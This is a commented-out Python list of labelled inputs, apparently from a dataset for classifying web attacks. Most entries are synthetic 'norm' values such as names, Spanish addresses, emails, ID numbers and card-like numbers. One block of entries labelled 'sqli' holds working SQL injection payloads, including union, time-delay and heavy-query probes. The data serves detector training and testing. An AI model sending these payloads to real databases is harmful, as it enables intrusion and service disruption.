#  {'payload': 'cascabela', 'attack_type': 'norm'},
#  {'payload': 'ludolfo', 'attack_type': 'norm'},
#  {'payload': 'snerd@bwds.tj', 'attack_type': 'norm'},
#  {'payload': '15365381r', 'attack_type': 'norm'},
#  {'payload': 'regueras de arriba', 'attack_type': 'norm'},
#  {'payload': '08281', 'attack_type': 'norm'},
#  {'payload': '7497', 'attack_type': 'norm'},
#  {'payload': 'mckenney', 'attack_type': 'norm'},
#  {'payload': 'poma gozalbo', 'attack_type': 'norm'},
#  {'payload': 'loti@ajuntamentbarcelona2-0.is', 'attack_type': 'norm'},
#  {'payload': 'c/ huertas altas, 114', 'attack_type': 'norm'},
#  {'payload': 'sequera de haza, la', 'attack_type': 'norm'},
#  {'payload': '8755728520539974', 'attack_type': 'norm'},
#  {'payload': 'kindra', 'attack_type': 'norm'},
#  {'payload': 'josias', 'attack_type': 'norm'},
#  {'payload': 'fonoll zurko', 'attack_type': 'norm'},
#  {'payload': '07408152j', 'attack_type': 'norm'},
#  {'payload': 'c/ aira de villaescusa 199, 1f', 'attack_type': 'norm'},
#  {'payload': '09530', 'attack_type': 'norm'},
#  {'payload': '4190369223587522', 'attack_type': 'norm'},
#  {'payload': '5x8r0r', 'attack_type': 'norm'},
#  {'payload': '5599', 'attack_type': 'norm'},
#  {'payload': 'indocto', 'attack_type': 'norm'},
#  {'payload': 'serneo', 'attack_type': 'norm'},
#  {'payload': 'marieau8@clementelr.nz', 'attack_type': 'norm'},
#  {'payload': '24314757p', 'attack_type': 'norm'},
#  {'payload': '04742', 'attack_type': 'norm'},
#  {'payload': '3363230401310436', 'attack_type': 'norm'},
#  {'payload': 'correccionalmente', 'attack_type': 'norm'},
#  {'payload': 'cleofs', 'attack_type': 'norm'},
#  {'payload': 'europa, 58 2-f', 'attack_type': 'norm'},
#  {'payload': '21388', 'attack_type': 'norm'},
#  {'payload': 'vasilopo', 'attack_type': 'norm'},
#  {'payload': 'ladronzue_lo', 'attack_type': 'norm'},
#  {'payload': 'elbeze', 'attack_type': 'norm'},
#  {'payload': 'cachapera', 'attack_type': 'norm'},
#  {'payload': 'hibbert.bupp@hojadecalculo.com.mil', 'attack_type': 'norm'},
#  {'payload': '56163821y', 'attack_type': 'norm'},
#  {'payload': 'zarratn', 'attack_type': 'norm'},
#  {'payload': '6341227779092516', 'attack_type': 'norm'},
#  {'payload': 'er3t3e1', 'attack_type': 'norm'},
#  {'payload': 'atanaspulos', 'attack_type': 'norm'},
#  {'payload': '38355013y', 'attack_type': 'norm'},
#  {'payload': 'plaa catalunya 124, 5-b', 'attack_type': 'norm'},
#  {'payload': '19312', 'attack_type': 'norm'},
#  {'payload': '1437589782727245', 'attack_type': 'norm'},
#  {'payload': 'cuatriduana', 'attack_type': 'norm'},
#  {'payload': '1565', 'attack_type': 'norm'},
#  {'payload': 'ti7o', 'attack_type': 'norm'},
#  {'payload': 'folch pintado', 'attack_type': 'norm'},
#  {'payload': '00474767r', 'attack_type': 'norm'},
#  {'payload': 'manuel pereira s/n 12?a', 'attack_type': 'norm'},
#  {'payload': 'esther', 'attack_type': 'norm'},
#  {'payload': 'labranto', 'attack_type': 'norm'},
#  {'payload': 'pelez bastus', 'attack_type': 'norm'},
#  {'payload': 'pianka@noviasteresapalacios.mc', 'attack_type': 'norm'},
#  {'payload': 'c/ doctor ferran, 193', 'attack_type': 'norm'},
#  {'payload': '38787', 'attack_type': 'norm'},
#  {'payload': 'fitzgera', 'attack_type': 'norm'},
#  {'payload': '13g0e7at42a', 'attack_type': 'norm'},
#  {'payload': 'kinnie', 'attack_type': 'norm'},
#  {'payload': 'ret4ne3or', 'attack_type': 'norm'},
#  {'payload': 'vettenranta@infopromo.az', 'attack_type': 'norm'},
#  {'payload': 'el caaveral 130, 5-f', 'attack_type': 'norm'},
#  {'payload': '9139561296743472', 'attack_type': 'norm'},
#  {'payload': 'valina', 'attack_type': 'norm'},
#  {'payload': 'yoselie', 'attack_type': 'norm'},
#  {'payload': 'pool echenique', 'attack_type': 'norm'},
#  {'payload': 'calle holanda 146,', 'attack_type': 'norm'},
#  {'payload': 'tres villas, las', 'attack_type': 'norm'},
#  {'payload': '5426744631176158', 'attack_type': 'norm'},
#  {'payload': 'patrica0', 'attack_type': 'norm'},
#  {'payload': 'mankowsk', 'attack_type': 'norm'},
#  {'payload': '4a39c44a', 'attack_type': 'norm'},
#  {'payload': 'bow@whitepearlresort.pl', 'attack_type': 'norm'},
#  {'payload': '01472954b', 'attack_type': 'norm'},
#  {'payload': 'adradas', 'attack_type': 'norm'},
#  {'payload': '18417', 'attack_type': 'norm'},
#  {'payload': 'smelters', 'attack_type': 'norm'},
#  {'payload': 'tamboreo', 'attack_type': 'norm'},
#  {'payload': 'lamas', 'attack_type': 'norm'},
#  {'payload': 'sipperly.nakamoto@ceramicasmio.ht', 'attack_type': 'norm'},
#  {'payload': 'carretera 200 hasta km. 1 barra de mio 175',
#   'attack_type': 'norm'},
#  {'payload': 'manzanilla', 'attack_type': 'norm'},
#  {'payload': '1181707541494323', 'attack_type': 'norm'},
#  {'payload': 'jalaie', 'attack_type': 'norm'},
#  {'payload': '1613', 'attack_type': 'norm'},
#  {'payload': 'joelly', 'attack_type': 'norm'},
#  {'payload': 'flaviano', 'attack_type': 'norm'},
#  {'payload': 'oshea_knowles@tiaherminia.gh', 'attack_type': 'norm'},
#  {'payload': 'calle del llenguadoc s/n, 6e', 'attack_type': 'norm'},
#  {'payload': 'pujalt', 'attack_type': 'norm'},
#  {'payload': '0269447503610316', 'attack_type': 'norm'},
#  {'payload': 'kristel', 'attack_type': 'norm'},
#  {'payload': 'reiji', 'attack_type': 'norm'},
#  {'payload': 'estolano boget', 'attack_type': 'norm'},
#  {'payload': '62145911a', 'attack_type': 'norm'},
#  {'payload': 'travesia barrionuevo, 49', 'attack_type': 'norm'},
#  {'payload': '7738690201675696', 'attack_type': 'norm'},
#  {'payload': 'daisey', 'attack_type': 'norm'},
#  {'payload': '2925', 'attack_type': 'norm'},
#  {'payload': 'doris', 'attack_type': 'norm'},
#  {'payload': 'bergad faix', 'attack_type': 'norm'},
#  {'payload': 'sibirskaia@euskalcasino.es', 'attack_type': 'norm'},
#  {'payload': 'c/ lope de rueda s/n, 9-f', 'attack_type': 'norm'},
#  {'payload': 'alcntar', 'attack_type': 'norm'},
#  {'payload': 'lozier', 'attack_type': 'norm'},
#  {'payload': 'alguese', 'attack_type': 'norm'},
#  {'payload': '30482828p', 'attack_type': 'norm'},
#  {'payload': 'c/ ulises 17,', 'attack_type': 'norm'},
#  {'payload': 'rube', 'attack_type': 'norm'},
#  {'payload': 'enlutada', 'attack_type': 'norm'},
#  {'payload': 'blount', 'attack_type': 'norm'},
#  {'payload': 'sugesto', 'attack_type': 'norm'},
#  {'payload': 'suau', 'attack_type': 'norm'},
#  {'payload': 'germain@elcorteitaliano.cat', 'attack_type': 'norm'},
#  {'payload': 'c/ de la sabina, s/n 8?b', 'attack_type': 'norm'},
#  {'payload': 'betelu', 'attack_type': 'norm'},
#  {'payload': 'mcglynn', 'attack_type': 'norm'},
#  {'payload': 'midkiff_mikuni@directoriogratuito.kh', 'attack_type': 'norm'},
#  {'payload': 'calle rascafria, 103,', 'attack_type': 'norm'},
#  {'payload': 'gimialcn', 'attack_type': 'norm'},
#  {'payload': '3582197540300309', 'attack_type': 'norm'},
#  {'payload': 'sprouse', 'attack_type': 'norm'},
#  {'payload': '1827', 'attack_type': 'norm'},
#  {'payload': 'addons', 'attack_type': 'norm'},
#  {'payload': 'karla', 'attack_type': 'norm'},
#  {'payload': 'jauregui cortines', 'attack_type': 'norm'},
#  {'payload': '86800649y', 'attack_type': 'norm'},
#  {'payload': 'paratge lila 30, 10?c', 'attack_type': 'norm'},
#  {'payload': '9091453994786923', 'attack_type': 'norm'},
#  {'payload': 'dyck', 'attack_type': 'norm'},
#  {'payload': 'pereda barrio', 'attack_type': 'norm'},
#  {'payload': 'barrymore@hipermadrid.pe', 'attack_type': 'norm'},
#  {'payload': 'doctor waksmann, 120, 7?b', 'attack_type': 'norm'},
#  {'payload': 'caudete', 'attack_type': 'norm'},
#  {'payload': '3161746053397457', 'attack_type': 'norm'},
#  {'payload': 'chao', 'attack_type': 'norm'},
#  {'payload': '4403', 'attack_type': 'norm'},
#  {'payload': 'patacki', 'attack_type': 'norm'},
#  {'payload': 'xifr', 'attack_type': 'norm'},
#  {'payload': 'pleasande@doloresmusculares.aq', 'attack_type': 'norm'},
#  {'payload': 'sanchez 49,', 'attack_type': 'norm'},
#  {'payload': '9008082484622624', 'attack_type': 'norm'},
#  {'payload': 'o+bispar', 'attack_type': 'norm'},
#  {'payload': 'adgardo', 'attack_type': 'norm'},
#  {'payload': '36914497a', 'attack_type': 'norm'},
#  {'payload': 'nucleo santiago apostol 34, 4?f', 'attack_type': 'norm'},
#  {'payload': '20491', 'attack_type': 'norm'},
#  {'payload': '4811716935763521', 'attack_type': 'norm'},
#  {'payload': 'inord2n6da7e401', 'attack_type': 'norm'},
#  {'payload': '5445', 'attack_type': 'norm'},
#  {'payload': 'a65esad0', 'attack_type': 'norm'},
#  {'payload': 'efrn', 'attack_type': 'norm'},
#  {'payload': 'calle castaos 90', 'attack_type': 'norm'},
#  {'payload': 'torre-cardela', 'attack_type': 'norm'},
#  {'payload': '4867284155125635', 'attack_type': 'norm'},
#  {'payload': 'oran', 'attack_type': 'norm'},
#  {'payload': 'tesisteco avi', 'attack_type': 'norm'},
#  {'payload': 'pepet@naturalchild.co', 'attack_type': 'norm'},
#  {'payload': '01308', 'attack_type': 'norm'},
#  {'payload': '6702564951251728', 'attack_type': 'norm'},
#  {'payload': 'remante', 'attack_type': 'norm'},
#  {'payload': '919', 'attack_type': 'norm'},
#  {'payload': 'afoscarse', 'attack_type': 'norm'},
#  {'payload': 'net.valdez@salaparis.gt', 'attack_type': 'norm'},
#  {'payload': 'c/ja del indiano, s/n,', 'attack_type': 'norm'},
#  {'payload': 'illano', 'attack_type': 'norm'},
#  {'payload': '2872946473881757', 'attack_type': 'norm'},
#  {'payload': 'spears', 'attack_type': 'norm'},
#  {'payload': 'triana', 'attack_type': 'norm'},
#  {'payload': 'del ngel kercad', 'attack_type': 'norm'},
#  {'payload': '10421521z', 'attack_type': 'norm'},
#  {'payload': 'etorbidea askatasuna 170, 8?a', 'attack_type': 'norm'},
#  {'payload': '2754013363983769', 'attack_type': 'norm'},
#  {'payload': 'huong', 'attack_type': 'norm'},
#  {'payload': '1729', 'attack_type': 'norm'},
#  {'payload': 'tse', 'attack_type': 'norm'},
#  {'payload': 'victoria de los angeles', 'attack_type': 'norm'},
#  {'payload': 'ventura motn', 'attack_type': 'norm'},
#  {'payload': 'roure, 43, 3?d', 'attack_type': 'norm'},
#  {'payload': '32648', 'attack_type': 'norm'},
#  {'payload': 'meggy', 'attack_type': 'norm'},
#  {'payload': '3o22ciabl3', 'attack_type': 'norm'},
#  {'payload': 'ayat rozas', 'attack_type': 'norm'},
#  {'payload': 'verani@viajesdacapalla.gq', 'attack_type': 'norm'},
#  {'payload': 'quinita flores 75,', 'attack_type': 'norm'},
#  {'payload': 'botarell', 'attack_type': 'norm'},
#  {'payload': '3893864101962581', 'attack_type': 'norm'},
#  {'payload': 'etchieso', 'attack_type': 'norm'},
#  {'payload': '9159', 'attack_type': 'norm'},
#  {'payload': 'marieann', 'attack_type': 'norm'},
#  {'payload': 'penarroya ingla', 'attack_type': 'norm'},
#  {'payload': 'gayle@freetag.name', 'attack_type': 'norm'},
#  {'payload': 'el halcon 154, 8?f', 'attack_type': 'norm'},
#  {'payload': '03314', 'attack_type': 'norm'},
#  {'payload': 'evin', 'attack_type': 'norm'},
#  {'payload': 'sa6r2', 'attack_type': 'norm'},
#  {'payload': 'gorcy.davis@carmensanmartin.bo', 'attack_type': 'norm'},
#  {'payload': '16601924h', 'attack_type': 'norm'},
#  {'payload': 'destriana', 'attack_type': 'norm'},
#  {'payload': '25307', 'attack_type': 'norm'},
#  {'payload': '9639', 'attack_type': 'norm'},
#  {'payload': 'longo', 'attack_type': 'norm'},
#  {'payload': 'armero filippi', 'attack_type': 'norm'},
#  {'payload': 'uzaki@23horas.ie', 'attack_type': 'norm'},
#  {'payload': '24391', 'attack_type': 'norm'},
#  {'payload': 'lei-see', 'attack_type': 'norm'},
#  {'payload': 'rahue', 'attack_type': 'norm'},
#  {'payload': 'serna kovac', 'attack_type': 'norm'},
#  {'payload': '51795949h', 'attack_type': 'norm'},
#  {'payload': 'calle del derecho 17,', 'attack_type': 'norm'},
#  {'payload': '50693', 'attack_type': 'norm'},
#  {'payload': '9473535060757439', 'attack_type': 'norm'},
#  {'payload': '7a2a6t1ro', 'attack_type': 'norm'},
#  {'payload': '1858', 'attack_type': 'norm'},
#  {'payload': 'pavorde', 'attack_type': 'norm'},
#  {'payload': 'elois', 'attack_type': 'norm'},
#  {'payload': 'terrio@likeanangel.dz', 'attack_type': 'norm'},
#  {'payload': '46773841y', 'attack_type': 'norm'},
#  {'payload': 'arndiga', 'attack_type': 'norm'},
#  {'payload': '8554607392278464', 'attack_type': 'norm'},
#  {'payload': 'muntaner nevado', 'attack_type': 'norm'},
#  {'payload': 'vasilescu.lisi@drogasvirtuales.sc', 'attack_type': 'norm'},
#  {'payload': 'luis braille, 33, 12?d', 'attack_type': 'norm'},
#  {'payload': 'matar', 'attack_type': 'norm'},
#  {'payload': '4608056297024601', 'attack_type': 'norm'},
#  {'payload': 'werling', 'attack_type': 'norm'},
#  {'payload': '7012', 'attack_type': 'norm'},
#  {'payload': 'barnhill', 'attack_type': 'norm'},
#  {'payload': 'quintilio', 'attack_type': 'norm'},
#  {'payload': 'naharro', 'attack_type': 'norm'},
#  {'payload': '38980059g', 'attack_type': 'norm'},
#  {'payload': 'calle isis, 180', 'attack_type': 'norm'},
#  {'payload': '6172398321911966', 'attack_type': 'norm'},
#  {'payload': 'janeva', 'attack_type': 'norm'},
#  {'payload': 'lzaro', 'attack_type': 'norm'},
#  {'payload': 'hinwood-laretei@addl.es', 'attack_type': 'norm'},
#  {'payload': 'canfranc', 'attack_type': 'norm'},
#  {'payload': '26323', 'attack_type': 'norm'},
#  {'payload': 'radioelctrica', 'attack_type': 'norm'},
#  {'payload': '3679', 'attack_type': 'norm'},
#  {'payload': 'apotrerar', 'attack_type': 'norm'},
#  {'payload': 'mochn quer', 'attack_type': 'norm'},
#  {'payload': '30503437d', 'attack_type': 'norm'},
#  {'payload': 'carrer asturies, 49', 'attack_type': 'norm'},
#  {'payload': '8582534834926521', 'attack_type': 'norm'},
#  {'payload': 'aghili', 'attack_type': 'norm'},
#  {'payload': 'colunga corrius', 'attack_type': 'norm'},
#  {'payload': 'bukoontot@google-movil.cm', 'attack_type': 'norm'},
#  {'payload': 'c/ asuncion 115 5e', 'attack_type': 'norm'},
#  {'payload': 'almonacid de la sierra', 'attack_type': 'norm'},
#  {'payload': 'rorke', 'attack_type': 'norm'},
#  {'payload': '3u23pe', 'attack_type': 'norm'},
#  {'payload': 'philippa', 'attack_type': 'norm'},
#  {'payload': 'carroar', 'attack_type': 'norm'},
#  {'payload': 'schwab.carli@emepleo.info', 'attack_type': 'norm'},
#  {'payload': 'calle batalla de muhlberg, 25, 6?a', 'attack_type': 'norm'},
#  {'payload': '27860', 'attack_type': 'norm'},
#  {'payload': 'brenda', 'attack_type': 'norm'},
#  {'payload': 'alpar-ornstein@rockefeller.nu', 'attack_type': 'norm'},
#  {'payload': '15423399j', 'attack_type': 'norm'},
#  {'payload': '46844', 'attack_type': 'norm'},
#  {'payload': 'gourley', 'attack_type': 'norm'},
#  {'payload': 'consalve', 'attack_type': 'norm'},
#  {'payload': 'c406l2n5', 'attack_type': 'norm'},
#  {'payload': 'kunneke@storagecraft.nz', 'attack_type': 'norm'},
#  {'payload': '89740217j', 'attack_type': 'norm'},
#  {'payload': 'igzquiza', 'attack_type': 'norm'},
#  {'payload': '17867', 'attack_type': 'norm'},
#  {'payload': 'zandra', 'attack_type': 'norm'},
#  {'payload': 'agenor', 'attack_type': 'norm'},
#  {'payload': 'chamberlain@muevemiweb.al', 'attack_type': 'norm'},
#  {'payload': 'calle jaime ferranz 51', 'attack_type': 'norm'},
#  {'payload': '12163', 'attack_type': 'norm'},
#  {'payload': "1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",
#   'attack_type': 'sqli'},
#  {'payload': '1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666',
#   'attack_type': 'sqli'},
#  {'payload': '1) where 7956=7956 or sleep(5)#', 'attack_type': 'sqli'},
#  {'payload': "-7387'))) order by 1--", 'attack_type': 'sqli'},
#  {'payload': '1))) union all select null,null,null#', 'attack_type': 'sqli'},
#  {'payload': '-5622" where 7970=7970 union all select 7970,7970,7970,7970,7970--',
#   'attack_type': 'sqli'},
#  {'payload': '-9860%" union all select 6996,6996,6996,6996,6996,6996#',
#   'attack_type': 'sqli'},
#  {'payload': '1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240',
#   'attack_type': 'sqli'},
#  {'payload': '1%"))) waitfor delay \'0:0:5\'--', 'attack_type': 'sqli'},
#  {'payload': '1") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#',
#   'attack_type': 'sqli'},
#  {'payload': '1%");select benchmark(5000000,md5(0x714e4153))#',
#   'attack_type': 'sqli'},
#  {'payload': "1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",
#   'attack_type': 'sqli'},
#  {'payload': "-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",
#   'attack_type': 'sqli'},
#  {'payload': "1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",
#   'attack_type': 'sqli'},
#  {'payload': '-2583") where 3455=3455 or make_set(9354=9354,7185)--',
#   'attack_type': 'sqli'},
#  {'payload': '-6267"))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((("rqws"="rqws',
#   'attack_type': 'sqli'},
#  {'payload': "1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",
#   'attack_type': 'sqli'},
#  {'payload': '8496429893525706', 'attack_type': 'norm'},
#  {'payload': 't324a3ra5a', 'attack_type': 'norm'},
#  {'payload': '4932', 'attack_type': 'norm'},
#  {'payload': 'di0cut6dor7', 'attack_type': 'norm'},
#  {'payload': 'jener monaj', 'attack_type': 'norm'},
#  {'payload': 'los polancos 133', 'attack_type': 'norm'},
#  {'payload': 'pintanos, los', 'attack_type': 'norm'},
#  {'payload': 'berrisfo', 'attack_type': 'norm'},
#  {'payload': 'zaguero', 'attack_type': 'norm'},
#  {'payload': '39202408n', 'attack_type': 'norm'},
#  {'payload': 'c/ montaer ruiz, 24, 12a', 'attack_type': 'norm'},
#  {'payload': '3609841962548925', 'attack_type': 'norm'},
#  {'payload': 'isador', 'attack_type': 'norm'},
#  {'payload': '4906', 'attack_type': 'norm'},
#  {'payload': 'marcanti', 'attack_type': 'norm'},
#  {'payload': 'jezabel', 'attack_type': 'norm'},
#  {'payload': 'pawluszek segu', 'attack_type': 'norm'},
#  {'payload': '05782219l', 'attack_type': 'norm'},
#  {'payload': 'c/ ricardo codoer, 112,', 'attack_type': 'norm'},
#  {'payload': 'brunhild', 'attack_type': 'norm'},
#  {'payload': 'te3496', 'attack_type': 'norm'},
#  {'payload': 'allaert@chicasdiabolo.ru', 'attack_type': 'norm'},
#  {'payload': '63974696n', 'attack_type': 'norm'},
#  {'payload': 'fla', 'attack_type': 'norm'},
#  {'payload': '50629', 'attack_type': 'norm'},
#  {'payload': 'demostrar', 'attack_type': 'norm'},
#  {'payload': '6212', 'attack_type': 'norm'},
#  {'payload': 'refriega', 'attack_type': 'norm'},
#  {'payload': 'isidoro', 'attack_type': 'norm'},
#  {'payload': '06918701w', 'attack_type': 'norm'},
#  {'payload': 'calle la caldera, 76 11-c', 'attack_type': 'norm'},
#  {'payload': '4898771590601702', 'attack_type': 'norm'},
#  {'payload': 'lap', 'attack_type': 'norm'},
#  {'payload': '42287106l', 'attack_type': 'norm'},
#  {'payload': 'calle beato tomas de zumarraga, 89 12-c', 'attack_type': 'norm'},
#  {'payload': 'olsen', 'attack_type': 'norm'},
#  {'payload': '5urgui8a', 'attack_type': 'norm'},
#  {'payload': 'spindler1', 'attack_type': 'norm'},
#  {'payload': 'trincha-32r1', 'attack_type': 'norm'},
#  {'payload': '08363269d', 'attack_type': 'norm'},
#  {'payload': 'alqueria de pixarroda, 27', 'attack_type': 'norm'},
#  {'payload': '0277189059505279', 'attack_type': 'norm'},
#  {'payload': 'dotan', 'attack_type': 'norm'},
#  {'payload': 'terribas', 'attack_type': 'norm'},
#  {'payload': 'leftwich@sms24h.sb', 'attack_type': 'norm'},
#  {'payload': '12232', 'attack_type': 'norm'},
#  {'payload': '5580428033394873', 'attack_type': 'norm'},
#  {'payload': 'comba', 'attack_type': 'norm'},
#  {'payload': '1140', 'attack_type': 'norm'},
#  {'payload': 'e23i6gulo', 'attack_type': 'norm'},
#  {'payload': 'nicolo', 'attack_type': 'norm'},
#  {'payload': 'floor@aebo.af', 'attack_type': 'norm'},
#  {'payload': '88341714w', 'attack_type': 'norm'},
#  {'payload': '29639', 'attack_type': 'norm'},
#  {'payload': '0052422482512057', 'attack_type': 'norm'},
#  {'payload': 'nanni-prucnal@fighting-machines.gf', 'attack_type': 'norm'},
#  {'payload': '08447437c', 'attack_type': 'norm'},
#  {'payload': '46510', 'attack_type': 'norm'},
#  {'payload': '0878247632477262', 'attack_type': 'norm'},
#  {'payload': '973', 'attack_type': 'norm'},
#  {'payload': 'merl', 'attack_type': 'norm'},
#  {'payload': 'quintn', 'attack_type': 'norm'},
#  {'payload': 'bricat', 'attack_type': 'norm'},
#  {'payload': '03046730n', 'attack_type': 'norm'},
#  {'payload': 'ronda sant antoni maria claret 144,', 'attack_type': 'norm'},
#  {'payload': 'jawad', 'attack_type': 'norm'},
#  {'payload': '92frico', 'attack_type': 'norm'},
#  {'payload': 'pipiolo sandrini', 'attack_type': 'norm'},
#  {'payload': 'velero@softwaresaas.ec', 'attack_type': 'norm'},
#  {'payload': 'c/ barriada nueva andalucia, 79, 5?f', 'attack_type': 'norm'},
#  {'payload': 'lora', 'attack_type': 'norm'},
#  {'payload': 'anja', 'attack_type': 'norm'},
#  {'payload': '3803', 'attack_type': 'norm'},
#  {'payload': 'descarada', 'attack_type': 'norm'},
#  {'payload': 'lian', 'attack_type': 'norm'},
#  {'payload': '85640413m', 'attack_type': 'norm'},
#  {'payload': 'c/ san juan bautista 66, 1?f', 'attack_type': 'norm'},
#  {'payload': '24410', 'attack_type': 'norm'},
#  {'payload': '1710045357867718', 'attack_type': 'norm'},
#  {'payload': 'de la barca pitti', 'attack_type': 'norm'},
#  {'payload': 'dierking3@carmensanmartin.kn', 'attack_type': 'norm'},
#  {'payload': 'diaz camacho 107, 2-a', 'attack_type': 'norm'},
#  {'payload': '9636562879352994', 'attack_type': 'norm'},
#  {'payload': 'trashumacin', 'attack_type': 'norm'},
#  {'payload': '389', 'attack_type': 'norm'},
#  {'payload': 'hatajo', 'attack_type': 'norm'},
#  {'payload': 'yasna', 'attack_type': 'norm'},
#  {'payload': 'hymen_israeli@aulahost.vc', 'attack_type': 'norm'},
#  {'payload': 'cami llorito, 38', 'attack_type': 'norm'},
#  {'payload': '5968115219030593', 'attack_type': 'norm'},
#  {'payload': 'bordin', 'attack_type': 'norm'},
#  {'payload': 'jeria cifr', 'attack_type': 'norm'},
#  {'payload': 'litchterman.steiner6@myalbum.by', 'attack_type': 'norm'},
#  {'payload': 'calle costa de llevant, 52', 'attack_type': 'norm'},
#  {'payload': 'murillo el cuende', 'attack_type': 'norm'},
#  {'payload': 'ligurs', 'attack_type': 'norm'},
#  {'payload': 'retos9a1o', 'attack_type': 'norm'},
#  {'payload': 'braham', 'attack_type': 'norm'},
#  {'payload': 'wieth@camiones-hibridos.md', 'attack_type': 'norm'},
#  {'payload': 'cami can rabella, s/n', 'attack_type': 'norm'},
#  {'payload': 'manzano, el', 'attack_type': 'norm'},
#  {'payload': 'virchick1', 'attack_type': 'norm'},
#  {'payload': 'superable', 'attack_type': 'norm'},
#  {'payload': 'duran manero', 'attack_type': 'norm'},
#  {'payload': 'paris-loisel@viavilano.cr', 'attack_type': 'norm'},
#  {'payload': 'burgos, s/n, 1f', 'attack_type': 'norm'},
#  {'payload': 'boimorto', 'attack_type': 'norm'},
#  {'payload': '1959107690181502', 'attack_type': 'norm'},
#  {'payload': 'cycelia', 'attack_type': 'norm'},
#  {'payload': '1166', 'attack_type': 'norm'},
#  {'payload': 'swope', 'attack_type': 'norm'},
#  {'payload': 'gutman@latiendadecolchones.mn', 'attack_type': 'norm'},
#  {'payload': '86626999y', 'attack_type': 'norm'},
#  {'payload': 'cubillas de santa marta', 'attack_type': 'norm'},
#  {'payload': '10182', 'attack_type': 'norm'},
#  {'payload': 'raha', 'attack_type': 'norm'},
#  {'payload': 'de5pi6ar4za4', 'attack_type': 'norm'},
#  {'payload': 'sagu cnstenla', 'attack_type': 'norm'},
#  {'payload': 'santaniello_tabernero@enfuerteventura.com.ni',
#   'attack_type': 'norm'},
#  {'payload': 'plaza asociacion de la prensa 107', 'attack_type': 'norm'},
#  {'payload': 'segura de los baos', 'attack_type': 'norm'},
#  {'payload': 'reid5', 'attack_type': 'norm'},
#  {'payload': 'chimenea', 'attack_type': 'norm'},
#  {'payload': 'jailyn', 'attack_type': 'norm'},
#  {'payload': 'irado', 'attack_type': 'norm'},
#  {'payload': 'norring-fujikawa@autoconstruccion.au', 'attack_type': 'norm'},
#  {'payload': 'plza. salamanca 39,', 'attack_type': 'norm'},
#  {'payload': '50780', 'attack_type': 'norm'},
#  {'payload': '2787973107257855', 'attack_type': 'norm'},
#  {'payload': 'd060u2ar', 'attack_type': 'norm'},
#  {'payload': 'hania', 'attack_type': 'norm'},
#  {'payload': 'hesseman.dolen@gaudio.mu', 'attack_type': 'norm'},
#  {'payload': 'calle vallseca 123', 'attack_type': 'norm'},
#  {'payload': '5176682769033876', 'attack_type': 'norm'},
#  {'payload': 'guillory', 'attack_type': 'norm'},
#  {'payload': '5155', 'attack_type': 'norm'},
#  {'payload': 'mcculloc', 'attack_type': 'norm'},
#  {'payload': 'iris', 'attack_type': 'norm'},
#  {'payload': 'duo_davalos@designworld.cz', 'attack_type': 'norm'},
#  {'payload': 'isla de cuba 85 3-b', 'attack_type': 'norm'},
#  {'payload': 'coripe', 'attack_type': 'norm'},
#  {'payload': 'zauhar', 'attack_type': 'norm'},
#  {'payload': 'semanera', 'attack_type': 'norm'},
#  {'payload': 'langellotti', 'attack_type': 'norm'},
#  {'payload': 'schaafsma@gay-tantra.sj', 'attack_type': 'norm'},
#  {'payload': 'villanueva del rebollar', 'attack_type': 'norm'},
#  {'payload': '38450', 'attack_type': 'norm'},
#  {'payload': 'grimsley', 'attack_type': 'norm'},
#  {'payload': 'luego', 'attack_type': 'norm'},
#  {'payload': 'trampeador', 'attack_type': 'norm'},
#  {'payload': 'kovac', 'attack_type': 'norm'},
#  {'payload': 'calle de can castellvi 35, 10-h', 'attack_type': 'norm'},
#  {'payload': 'vindel', 'attack_type': 'norm'},
#  {'payload': 'humfrid', 'attack_type': 'norm'},
#  {'payload': 'expendedora', 'attack_type': 'norm'},
#  {'payload': 'carvajal', 'attack_type': 'norm'},
#  {'payload': 'lightner.manor@rosaserigrafia.as', 'attack_type': 'norm'},
#  {'payload': 'castellnovo', 'attack_type': 'norm'},
#  {'payload': '19127', 'attack_type': 'norm'},
#  {'payload': 'ania', 'attack_type': 'norm'},
#  {'payload': 'esmilcea', 'attack_type': 'norm'},
#  {'payload': 'huerfanidad', 'attack_type': 'norm'},
#  {'payload': 'robertino', 'attack_type': 'norm'},
#  {'payload': '91220241x', 'attack_type': 'norm'},
#  {'payload': 'jose gomez gallito, 107,', 'attack_type': 'norm'},
#  {'payload': '32252', 'attack_type': 'norm'},
#  {'payload': '0577312599845778', 'attack_type': 'norm'},
#  {'payload': 'inoportunamente', 'attack_type': 'norm'},
#  {'payload': 'cibeles', 'attack_type': 'norm'},
#  {'payload': 'carminati@granbretana.com.uk', 'attack_type': 'norm'},
#  {'payload': '33273113w', 'attack_type': 'norm'},
#  {'payload': 'munbrega', 'attack_type': 'norm'},
#  {'payload': '4611888318080805', 'attack_type': 'norm'},
#  {'payload': 'adapuesto', 'attack_type': 'norm'},
#  {'payload': '3151', 'attack_type': 'norm'},
#  {'payload': '9o52cardea7', 'attack_type': 'norm'},
#  {'payload': 'benito@mayoriasilenciosa.mu', 'attack_type': 'norm'},
#  {'payload': 'calle juan de sevilla 102 3c', 'attack_type': 'norm'},
#  {'payload': 'cabanabona', 'attack_type': 'norm'},
#  {'payload': 'kouhi', 'attack_type': 'norm'},
#  {'payload': '4az', 'attack_type': 'norm'},
#  {'payload': '78267819s', 'attack_type': 'norm'},
#  {'payload': 'calle rendona 45, 5-a', 'attack_type': 'norm'},
#  {'payload': 'fady', 'attack_type': 'norm'},
#  {'payload': 'a8o8decer', 'attack_type': 'norm'},
#  {'payload': 'sonoe', 'attack_type': 'norm'},
#  {'payload': 'idalio', 'attack_type': 'norm'},
#  {'payload': 'portal tauler', 'attack_type': 'norm'},
#  {'payload': 'edlund@cementoscalibra.yu', 'attack_type': 'norm'},
#  {'payload': 'sant quirze de besora', 'attack_type': 'norm'},
#  {'payload': '27784', 'attack_type': 'norm'},
